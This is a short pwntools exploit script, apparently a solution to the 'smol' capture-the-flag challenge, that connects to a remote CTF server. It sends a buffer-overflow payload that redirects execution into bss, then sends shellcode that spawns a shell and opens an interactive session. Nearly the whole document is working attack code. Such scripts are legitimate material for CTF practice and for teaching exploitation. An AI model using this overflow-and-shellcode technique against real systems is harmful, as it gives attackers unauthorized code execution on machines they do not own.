from pwn import *

context.binary = './smol'
context.arch = 'amd64'
elf = ELF('./smol')

#p = process('./smol')
p = remote('pwn.utctf.live', 9998)

bss = 0x402000

payload = b'A' * 8
# オフセットがないとshellcodeのpushがうまく動かない
payload += p64(bss + 0x28)
payload += p64(0x401015)
p.sendline(payload)

payload = b'A' * 0x10
payload += p64(0x402038)
payload += asm(shellcraft.sh())
p.sendline(payload)

p.interactive()
